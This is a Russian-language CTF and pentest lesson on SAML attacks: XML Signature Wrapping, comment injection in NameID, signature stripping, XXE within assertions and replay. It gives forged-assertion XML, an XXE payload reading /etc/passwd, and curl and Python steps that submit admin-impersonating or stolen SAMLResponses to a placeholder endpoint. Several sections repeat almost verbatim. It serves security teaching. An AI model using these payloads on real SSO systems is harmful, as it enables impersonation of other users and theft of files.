---
id: web-saml-deep
title: "SAML deep: XSW, comment injection, signature stripping, replay"
category: web
parent: web-oauth-oidc-saml
difficulty: hard
order: 3
tags: [saml, xsw, xxe, signature, sso, xml]
prerequisites: [web-oauth-oidc-saml, web-xxe]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест корпоративных приложений"
estimated_minutes: 48
summary: "Продвинутые SAML-атаки: XML Signature Wrapping, инъекция комментариев, обход подписи и replay assertion."
---

SAML — XML-based SSO, используемый в корпоративных приложениях. Уязвимости в обработке SAML Assertion дают **аутентификацию под любого пользователя**, включая админа. Базовый урок `web-oauth-oidc-saml` даёт введение; здесь — настоящие классы атак: XML Signature Wrapping (XSW), comment injection, signature stripping, XXE внутри assertion, replay и условия (`NotOnOrAfter`, `Recipient`, `Audience`).

## Теория: структура и точки атаки

SAML Response — XML:
```xml
<samlp:Response>
  <saml:Assertion ID="a1">
    <saml:Subject><saml:NameID>user@corp</saml:NameID></saml:Subject>
    <saml:Conditions NotOnOrAfter="..."/>
    <saml:AttributeStatement>...roles...</saml:AttributeStatement>
  </saml:Assertion>
  <ds:Signature>...подпись...</ds:Signature>
</samlp:Response>
```

SP (Service Provider) проверяет подпись и **извлекает** данные (Subject, роли). Баги возникают, когда:
- подпись проверяется для **одного** узла, а данные берутся из **другого** (XSW);
- XML-парсер обрабатывает комментарии/кодировки не так, как верификатор (comment injection);
- подпись можно убрать/подменить, и SP не замечает;
- не проверяются `Conditions`, `Audience`, `Recipient`, `InResponseTo`.

## Атака 1: XML Signature Wrapping (XSW)

Идея: подпись валидна (мы переиспользуем легитимную подпись из своего assertion), но добавляем **второй** assertion, из которого SP читает данные. Восемь канонических вариантов (XSW1–XSW8) — от перемещения подписи до вложенных обёрток. Инструмент: **SAML Raider** (Burp-плагин) и **`xsw`-генераторы**.

Схема XSW (упрощённо): оригинальный подписанный assertion остаётся, а перед ним вставляется «злой» assertion с `admin`:

```xml
<samlp:Response>
  <saml:Assertion ID="evil"><Subject>admin</Subject>...</saml:Assertion>
  <saml:Assertion ID="a1"><Subject>user</Subject>
     <ds:Signature>...валидная подпись от user...</ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

SP проверяет подпись (по `a1`), а данные берёт из первого (evil). Успех → вход как admin.

## Атака 2: comment injection

Некоторые XML-парсеры игнорируют комментарии, некоторые — нет. Если SP использует два разных парсера (один для подписи, другой для данных), вставим комментарий, меняющий видимое имя:

```xml
<NameID>admin<!---->@corp.example</NameID>
```

Один парсер видит `admin@corp.example`, другой — `admin` (или наоборот). Классика: `admin<!---->.attacker.com` → верификатор видит атакующего, а логика — админа. Работает при несовпадении парсеров.

## Атака 3: signature stripping / подмена

- **Удаление подписи** — если SP не проверяет её наличие для некоторых типов assertion.
- **Подпись на Response вместо Assertion** — SP проверяет Response, а данные берёт из неподписанного Assertion.
- **Подмена `Reference URI`** — `#a1` на `#a2`.
- **Self-signed сертификат** — если SP не пиннит сертификат IdP, подписываем своим.

## Атака 4: XXE внутри SAML

SAML — XML. Если парсер не отключает внешние сущности:

```xml
<!DOCTYPE Response [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<saml:Assertion><Subject><NameID>&xxe;</NameID></Subject></saml:Assertion>
```

Даёт чтение файлов/SSRF на SP или IdP. См. `web-xxe-advanced`.

## Разобранный пример: XSW через SAML Raider

Шаг 1. Перехватываем легитимный SAML Response (свой аккаунт `user@corp`).

Шаг 2. В Burp открываем SAML Raider → «Edit» → «Apply XSW» (варианты 1–8). Или вручную добавляем злой assertion.

Шаг 3. Меняем Subject/роли на `admin@corp`, оставляя оригинальную подпись.

Шаг 4. Отправляем POST на `/SAML/ACS`:

```bash
curl -s -X POST https://sp.example/SAML/ACS \
  --data-urlencode "SAMLResponse=$(base64 -w0 evil.xml)" \
  --data "RelayState=/"
```

Шаг 5. Если ответ 302 на `/admin` и мы видим админ-панель — XSW сработал.

## Replay и условия

Даже с валидным assertion:
- **Replay** — переиспользование assertion до `NotOnOrAfter` (SP должен трекать `InResponseTo`/ID).
- **`NotOnOrAfter` игнорируется** — assertion бессрочен.
- **`Audience` не проверяется** — assertion для другого SP принимается.
- **`Recipient` не проверяется** — принимается на другом ACS.
- **`InResponseTo` не проверяется** — assertion можно подсунуть в чужую сессию.

```bash
# повторяем перехваченный assertion
curl -s -X POST https://sp.example/SAML/ACS --data-urlencode "SAMLResponse=$STOLEN"
```

## Инструменты

- **SAML Raider** (Burp) — XSW, редактор, сертификаты.
- **`samltool`** / **`python-saml`** — парсинг и пересборка.
- **`xxe`-пейлоады** для entity-инъекции.
- **Burp Collaborator** — OOB XXE.

## Частые ошибки

- **Сдаваться после «redirect_uri».** SAML-баги в подписи и парсинге, не в редиректах.
- **Не пробовать все XSW-варианты.** Их 8; какой сработает — зависит от парсера.
- **Забыть про кодировки.** `base64`, `deflate`, `POST`/`Redirect` binding.
- **Игнорировать XXE.** XML-парсер SAML — классическая цель.
- **Не проверять replay.** Часто assertion можно переиспользовать.
- **Путать IdP-initiated и SP-initiated.** Разные проверки (`InResponseTo`).
- **Ломать прод.** Тестируйте на своём аккаунте, не подделывайте чужой.

## Структура SAML и роли

SAML-аутентификация связывает IdP (провайдера идентичности) и SP (сервис-провайдера) через XML-assertion.

| Компонент | Роль |
|-----------|------|
| AuthnRequest | SP → IdP: запрос аутентификации |
| SAMLResponse | IdP → SP: assertion с данными |
| Assertion | утверждение (subject, атрибуты) |
| Signature | XML-DSig подпись assertion/response |
| RelayState | состояние для возврата |
| NameID | идентификатор пользователя |

```bash
# декодируем SAMLResponse (base64 -> XML)
echo "$SAML_RESPONSE" | base64 -d | xmllint --format - > resp.xml
# смотрим подпись и subject
grep -nE 'Signature|NameID|Attribute' resp.xml
```

## XSW: варианты обёртки подписи

XML Signature Wrapping — обход проверки подписи: подписанный элемент остаётся валидным, а приложение читает **другой** (неподписанный) элемент.

| Вариант | Идея |
|---------|------|
| XSW #1 | копия assertion с изменённым subject, оригинал с подписью |
| XSW #2 | подпись относится к обёрнутому узлу |
| XSW #3 | несколько assertion, подпись на первом |
| XSW #4 | подпись на отдельном узле, данные в другом |
| XSW #5 | namespace confusion |

```xml
<!-- упрощённо: два assertion, подпись на «оригинальном», данные — в «поддельном» -->
<samlp:Response>
  <Assertion ID="real"><Signature>...</Signature><Subject>attacker</Subject></Assertion>
  <Assertion ID="evil"><Subject>admin@corp</Subject></Assertion>
</samlp:Response>
```

Проверяйте, **какой** узел приложение использует для аутентификации и на каком стоит подпись.

## Comment injection и другие обходы

```xml
<!-- comment injection: парсер/сравнение по-разному видят NameID -->
<NameID>admin@corp.com<!-- x -->.attacker.com</NameID>
```

| Техника | Идея |
|---------|------|
| Comment injection | расхождение при разборе комментариев |
| Signature stripping | подпись не проверяется вовсе |
| Signature reuse | подпись от другого assertion |
| Namespace confusion | подмена namespace |
| XXE внутри SAML | внешние сущности |

```bash
# проверка: подпись вообще валидируется?
# удаляем <Signature> и отправляем assertion — если вход прошёл -> критично
```

## Разобранный пример: XSW через SAML Raider

```text
1) перехватываем валидный SAMLResponse (Burp)
2) загружаем в SAML Raider (расширение Burp)
3) применяем «XSW» — инструмент генерирует обёрнутые варианты
4) меняем NameID на admin@corp.com
5) отправляем — если вход выполнен как admin -> XSW сработал
```

```bash
# ручная проверка одного варианта
# 1) декодируем, правим NameID в неподписанном узле, кодируем обратно
python3 - <<'PY'
import base64
xml = open('resp.xml','rb').read().replace(b'attacker@x', b'admin@corp')
print(base64.b64encode(xml).decode())
PY
# 2) отправляем на ACS-эндпоинт SP
curl -s -X POST https://sp.example/saml/acs --data-urlencode "SAMLResponse=$B64"
```

## Replay и условия

SAML assertion содержит `NotBefore`/`NotOnOrAfter` и `InResponseTo`. Если они не проверяются — возможен replay.

```text
- перехватить валидный assertion
- отправить его повторно в пределах/вне срока
- проверить, принимается ли (отсутствие проверки времени/ID)
```

## Инструменты

| Инструмент | Назначение |
|-----------|-----------|
| `SAML Raider` (Burp) | XSW, подпись, декод |
| `python3-saml` | валидация/дебаг |
| `xmllint` | форматирование XML |
| `Burp` | перехват/повтор |
| `SAML-tool` | генерация тестов |

## Что делать дальше / решение

1. **Перехватите SAMLResponse.** Декодируйте и разберите.
2. **Проверьте подпись.** Валидируется ли, на каком узле.
3. **Попробуйте XSW.** SAML Raider генерирует варианты.
4. **Проверьте NameID.** Comment injection, namespace.
5. **Проверьте replay.** Время/`InResponseTo`.
6. **Проверьте XXE.** DOCTYPE/entity в XML.
7. **Зафиксируйте PoC.** Вход под чужой ролью.

## Практика и справочники

- **PortSwigger** — «SAML» research (XSW).
- **HackTricks** — «SAML».
- **SAML Raider** — расширение Burp.
- **OWASP** — SAML Security Cheat Sheet.

## Приоритеты при тестировании SAML

Начните с перехвата `SAMLResponse` и его декодирования. Затем проверьте, валидируется ли подпись вообще (удалите `<Signature>` и отправьте assertion). Если подпись проверяется, но не на том узле — пробуйте XSW (SAML Raider генерирует варианты). Далее — comment injection и namespace confusion в `NameID`, проверка времени (`NotBefore`/`NotOnOrAfter`) и `InResponseTo` на replay, а также XXE внутри XML. Каждая из этих проверок может дать вход под чужой ролью.

## Кратко

1. Декодировать assertion.
2. Проверить валидацию подписи.
3. XSW (SAML Raider).
4. Comment injection / namespace.
5. Replay (время/InResponseTo).
6. XXE.
7. PoC — вход под чужой ролью.

## Практика

- **SAML Raider** (Burp).
- **HackTricks** — SAML.
- **OWASP** — SAML Security Cheat Sheet.

## Расширенный разбор: почему SAML сложно тестировать

SAML-атаки требуют понимания XML-DSig: важно не только «подпись валидна», но и **какой узел** она покрывает и **какой узел** приложение читает для аутентификации. Классическая ошибка реализации — валидация подписи на одном assertion, а извлечение `NameID` — из другого (это и есть XSW). Вторая частая ошибка — проверка подписи на `Response`, а данных — на вложенном `Assertion`. Отсюда практический совет: при тестировании всегда создавайте **два** похожих узла (подписанный «оригинал» и поддельный с нужным `NameID`) и смотрите, какой из них побеждает.

```xml
<!-- идея: подпись на подписанном узле, данные — в неподписанном -->
<Response>
  <Assertion ID="signed"><Signature>...</Signature></Assertion>
  <Assertion ID="evil"><Subject><NameID>admin@corp</NameID></Subject></Assertion>
</Response>
```

SAML Raider автоматизирует генерацию таких вариантов; вручную достаточно менять порядок и вложенность узлов, сохраняя подпись неизменной.

## Квиз

```quiz
- question: "Что такое XML Signature Wrapping (XSW)?"
  options:
    - "Подпись проверяется для одного узла, а данные берутся из другого"
    - "Удаление подписи"
    - "Шифрование assertion"
    - "Смена алгоритма хеша"
  answer: 0
  explanation: "Подпись валидна, но данные — из неподписанного узла."
- question: "В чём суть comment injection в SAML?"
  options:
    - "Вставка SQL-кода"
    - "Разные парсеры по-разному видят комментарий в NameID"
    - "Удаление комментариев"
    - "Смена кодировки"
  answer: 1
  explanation: "Один парсер видит admin@corp, другой — admin."
- question: "Какой инструмент удобен для XSW?"
  options:
    - "sqlmap"
    - "SAML Raider"
    - "nmap"
    - "gobuster"
  answer: 1
  explanation: "Burp-плагин с готовыми XSW-вариантами."
- question: "Почему SAML-парсер уязвим к XXE?"
  options:
    - "SAML — это XML"
    - "SAML использует JSON"
    - "SAML шифруется"
    - "SAML не имеет DOCTYPE"
  answer: 0
  explanation: "Внешние сущности работают, если парсер не отключил их."
- question: "Какое условие assertion надо проверять против replay?"
  options:
    - "Content-Type"
    - "NotOnOrAfter и InResponseTo"
    - "User-Agent"
    - "Referer"
  answer: 1
  explanation: "Без проверки assertion переиспользуется."
```

## Где пригодится

- **CTF (Web):** SAML-задачи на обход аутентификации.
- **Bug bounty:** XSW и обход подписи — критические отчёты.
- **Пентест:** аудит корпоративного SSO (ADFS, Okta, Azure AD).
- **Работа (AppSec):** корректная проверка подписи/условий, отключение DTD, пиннинг сертификата.
